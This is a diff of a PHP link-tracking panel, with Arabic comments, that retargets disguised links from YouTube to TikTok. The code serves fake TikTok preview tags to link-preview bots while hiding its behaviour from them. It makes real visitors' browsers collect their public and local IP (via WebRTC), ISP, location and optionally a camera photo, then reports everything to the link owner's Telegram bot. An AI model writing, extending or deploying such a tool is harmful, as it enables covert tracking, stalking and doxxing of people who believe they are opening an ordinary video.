@@ -16,7 +16,6 @@ if (isset($_GET['proxy_img'])) {
     // إصلاح ترميز الصورة لضمان عدم كسر الرابط
     $img_url = base64_decode(urldecode($_GET['proxy_img']));
     
-    // إذا فشل الرابط، استخدم صورة افتراضية
     if (empty($img_url) || !filter_var($img_url, FILTER_VALIDATE_URL)) {
         header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
         exit;
@@ -27,7 +26,9 @@ if (isset($_GET['proxy_img'])) {
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+    // إضافة Referer مهم جداً لتخطي حماية سيرفرات صور تيك توك
+    curl_setopt($ch, CURLOPT_REFERER, 'https://www.tiktok.com/');
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     $image_data = curl_exec($ch);
     curl_close($ch);
 
@@ -62,7 +63,11 @@ if (isset($_GET['proxy_img'])) {
         }
     }
     // إذا فشلت المعالجة، أرسل الصورة الأصلية مباشرة
-    if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
+    if ($image_data) { 
+        header('Content-Type: image/jpeg'); 
+        echo $image_data; 
+        exit; 
+    }
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
     exit;
 }
@@ -125,71 +130,48 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// Extract YouTube video ID from various URL formats
-function extract_youtube_id($url) {
-    $patterns = [
-        '/(?:youtube\.com\/watch\?[^#]*?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/shorts\/|youtube\.com\/v\/|m\.youtube\.com\/watch\?[^#]*?v=)([a-zA-Z0-9_-]{11})/',
-        '/[?&]v=([a-zA-Z0-9_-]{11})/',
-    ];
-    foreach ($patterns as $pattern) {
-        if (preg_match($pattern, $url, $matches)) {
-            return $matches[1];
-        }
-    }
-    return null;
-}
-
-// Strong function to fetch YouTube metadata (protected against blocks)
-function fetch_youtube_meta($url) {
-    $video_id = extract_youtube_id($url);
-
+// دالة مخصصة واحترافية لجلب بيانات تيك توك
+function fetch_tiktok_meta($url) {
     $meta = [
-        'title'    => 'YouTube Video',
-        'image'    => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80',
-        'video_id' => $video_id
+        'title' => 'TikTok Video',
+        'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'
     ];
 
-    // Default thumbnail (guaranteed to exist) if we have an ID
-    if ($video_id) {
-        // استخدام hqdefault لأنها متوفرة 100% ولا تعطي خطأ 404 مثل maxresdefault
-        $meta['image'] = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
-    }
-
-    // Primary: YouTube oEmbed
-    $ch = curl_init("https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json");
+    // 1. الطريقة الأفضل: استخدام TikTok oEmbed API الرسمي
+    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
+    $ch = curl_init($oembed_url);
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
-        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     ]);
-    $response = curl_exec($ch); curl_close($ch);
+    $response = curl_exec($ch); 
+    curl_close($ch);
 
     if ($response) {
         $data = json_decode($response, true);
-        if (!empty($data['title'])) {
-            $meta['title'] = 'YouTube - ' . $data['title'];
-            if (!empty($data['thumbnail_url'])) {
-                $meta['image'] = $data['thumbnail_url'];
-            }
+        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
+            $meta['title'] = $data['title'];
+            $meta['image'] = $data['thumbnail_url'];
             return $meta;
         }
     }
 
-    // Fallback: read page meta tags
+    // 2. طريقة احتياطية: قراءة وسوم الميتا مباشرة (في حال حظر الـ API)
     $ch = curl_init($url);
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
-        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
         CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
     ]);
-    $html = curl_exec($ch); curl_close($ch);
+    $html = curl_exec($ch); 
+    curl_close($ch);
 
     if ($html) {
-        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
-            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $m)) {
+            $meta['image'] = str_replace('\\u002F', '/', $m[1]);
         }
-        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
-            $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-            $meta['title'] = (stripos($title, 'YouTube') === false) ? 'YouTube - ' . $title : $title;
+        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $m)) {
+            $meta['title'] = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
         }
     }
 
@@ -197,9 +179,7 @@ function fetch_youtube_meta($url) {
 }
 
 function get_real_ip() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        return $_SERVER['HTTP_CF_CONNECTING_IP'];
-    }
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
@@ -207,7 +187,6 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// Smart function to detect carrier from IP
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -270,25 +249,21 @@ if (isset($_GET['r'])) {
         $owner_tg_chat = $link['tg_chat'];
         $owner_tg_token = $link['tg_token'];
 
-        // Extract YouTube video ID for embed meta tags
-        $video_id = extract_youtube_id($target_redirect);
-        $video_embed_url = $video_id ? "https://www.youtube.com/embed/{$video_id}" : "";
-
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         
-        // فلتر شامل لجميع بوتات المعاينة بما فيها تيك توك
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktok/i', $ua);
+        // فلتر شامل لبوتات المعاينة (ماسنجر، واتساب، تيك توك، الخ)
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktok|musical_ly/i', $ua);
 
         if ($is_bot) {
-            // ترميز الصورة بطريقة آمنة لا تكسر الرابط
+            // ترميز الصورة للـ Proxy
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
             
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta charset="UTF-8">';
-            echo '<meta property="og:site_name" content="YouTube">';
+            echo '<meta property="og:site_name" content="TikTok">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:description" content="Watch this video on YouTube">'; // تمت الإضافة لتحسين المعاينة
+            echo '<meta property="og:description" content="Click to watch this video on TikTok">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="800">';
@@ -296,22 +271,8 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:type" content="image/jpeg">';
             echo '<meta property="og:type" content="video.other">';
             echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
-            
-            if (!empty($video_embed_url)) {
-                echo '<meta property="og:video" content="' . htmlspecialchars($video_embed_url) . '">';
-                echo '<meta property="og:video:secure_url" content="' . htmlspecialchars($video_embed_url) . '">';
-                echo '<meta property="og:video:type" content="text/html">';
-                echo '<meta property="og:video:width" content="1280">';
-                echo '<meta property="og:video:height" content="720">';
-                echo '<meta name="twitter:card" content="player">';
-                echo '<meta name="twitter:player" content="' . htmlspecialchars($video_embed_url) . '">';
-                echo '<meta name="twitter:player:width" content="1280">';
-                echo '<meta name="twitter:player:height" content="720">';
-            } else {
-                echo '<meta name="twitter:card" content="summary_large_image">';
-            }
+            echo '<meta name="twitter:card" content="summary_large_image">';
             echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta name="twitter:description" content="Watch this video on YouTube">';
             echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '</head><body></body></html>';
             exit();
@@ -320,7 +281,6 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
             
-            // Fastest response: send reply to browser immediately
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK'; 
                 fastcgi_finish_request();
@@ -328,11 +288,9 @@ if (isset($_GET['r'])) {
                 header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
 
-            // Continue collecting data in background
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
-            // إضافة سيرفرات Byteplus وغيرها لقائمة الحظر لعدم تسجيل بيانات المعاينة كزيارات
             $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter', 'Byteplus', 'Bytedance', 'TikTok', 'DigitalOcean', 'OVH', 'Hetzner', 'Linode', 'Alibaba', 'Tencent'];
             foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit; }
             
@@ -388,7 +346,6 @@ if (isset($_GET['r'])) {
         function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
-            // منع المتصفحات الوهمية (البوتات) من تنفيذ الكود
             if (navigator.webdriver) {
                 window.location.replace(targetUrl);
                 return;
@@ -443,7 +400,7 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// RECEIVE IMAGE IN BACKGROUND (if camera was slow)
+// RECEIVE IMAGE IN BACKGROUND
 // ==========================================
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     $code = $_POST['code'];
@@ -456,7 +413,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
 
 
 // ==========================================
-// CONTROL PANEL (Smooth and Fast)
+// CONTROL PANEL
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -528,7 +485,10 @@ if ($is_logged_in) {
         $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
-        $scraped = fetch_youtube_meta($target_url);
+        
+        // استخدام دالة تيك توك الجديدة
+        $scraped = fetch_tiktok_meta($target_url);
+        
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
         $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
         $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
@@ -714,15 +674,15 @@ if ($is_logged_in) {
                 </div>
 
                 <div class="card" style="border-color: var(--accent);">
-                    <div class="card-title">Create New YouTube Link</div>
+                    <div class="card-title">Create New TikTok Link</div>
                     <form method="POST">
                         <div class="form-group">
                             <label>Link Name</label>
                             <input type="text" name="link_name" required>
                         </div>
                         <div class="form-group">
-                            <label>YouTube Video URL</label>
-                            <input type="text" name="target_url" placeholder="https://www.youtube.com/watch?v=..." required>
+                            <label>TikTok Video URL</label>
+                            <input type="text" name="target_url" placeholder="https://www.tiktok.com/@username/video/..." required>
                         </div>
                         <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
                             <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
